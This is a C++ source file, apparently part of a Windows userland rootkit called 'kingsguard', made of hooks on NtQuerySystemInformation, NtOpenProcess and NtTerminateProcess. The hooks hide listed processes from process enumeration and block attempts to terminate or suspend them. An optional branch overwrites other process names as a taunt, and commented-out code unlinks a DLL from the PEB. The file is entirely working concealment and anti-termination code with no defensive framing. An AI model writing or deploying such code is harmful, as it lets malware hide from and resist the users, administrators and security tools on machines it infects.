#include "kingsguard.h"

// NTSTATUS WINAPI HookedNtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength)
// {
//     NTSTATUS status = OriginalNtQueryInformationProcess(ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ReturnLength);
//     if (status == STATUS_SUCCESS && ProcessInformationClass == ProcessBasicInformation)
//     {
//         PROCESS_BASIC_INFORMATION* information = (PROCESS_BASIC_INFORMATION*)ProcessInformation;
//         mPEB peb;
//         if (!ReadProcessMemory(GetCurrentProcess(), information->PebBaseAddress, (LPVOID)&peb, sizeof(mPPEB), NULL))
//             return status;
//         if ((DWORD)&peb < 1000)
//             return status;
//         RemoveDllFromPebW((mPPEB)&peb, DLL);
//         OutputDebugStringA("out");
//     }

//     return status;
// }

// NTSTATUS WINAPI HookedRtlDestroyProcessParameters(PRTL_USER_PROCESS_PARAMETERS ProcessParameters)
// {
//     OutputDebugStringW(ProcessParameters->ImagePathName.Buffer);

//     return OriginalRtlDestroyProcessParameters(ProcessParameters);
// }

NTSTATUS WINAPI HookedNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId)
{
    if (DesiredAccess & PROCESS_TERMINATE || DesiredAccess & PROCESS_SUSPEND_RESUME)
    {
        char name[MAX_PATH] = { 0 };
        if (!GetProcessName((DWORD)ClientId->UniqueProcess, name, MAX_PATH))
        {
            if (CheckExistsA(std::string(name), PROCESSA, false))
                return STATUS_ACCESS_DENIED;
        }
    }
    return OriginalNtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

NTSTATUS WINAPI HookedNtTerminateProcess(HANDLE hProcess, UINT code)
{
    if (GetProcessId(GetCurrentProcess()) == GetProcessId(hProcess))
        return OriginalNtTerminateProcess(hProcess, code);

// #if NOTERM
//    return 1;
// #else
    char name[MAX_PATH] = { 0 };

    if (!GetProcessName(GetProcessId(hProcess), name, MAX_PATH))
        if (CheckExistsA(std::string(name), PROCESSA, false))
            return STATUS_ACCESS_DENIED;

    return OriginalNtTerminateProcess(hProcess, code);
// #endif
}

NTSTATUS WINAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
    NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
    {
        PMY_SYSTEM_PROCESS_INFORMATION prev = PMY_SYSTEM_PROCESS_INFORMATION(SystemInformation);
        PMY_SYSTEM_PROCESS_INFORMATION curr = PMY_SYSTEM_PROCESS_INFORMATION((PUCHAR)prev + prev->NextEntryOffset);

        while (prev->NextEntryOffset != 0)
        {
            if (CheckExistsW(std::wstring(curr->ImageName.Buffer), PROCESSW, false))
            {
                if (curr->NextEntryOffset == 0)
                    prev->NextEntryOffset = 0;
                else
                    prev->NextEntryOffset += curr->NextEntryOffset;
                curr = prev;
            }
#if TAUNT
            else if (TAUNT)
            {
                WriteProcessMemory(GetCurrentProcess(), curr->ImageName.Buffer, TAUNTVALUE, curr->ImageName.Length, NULL);
            }
#endif
            prev = curr;
            curr = PMY_SYSTEM_PROCESS_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
        }
    }
    return status;
}
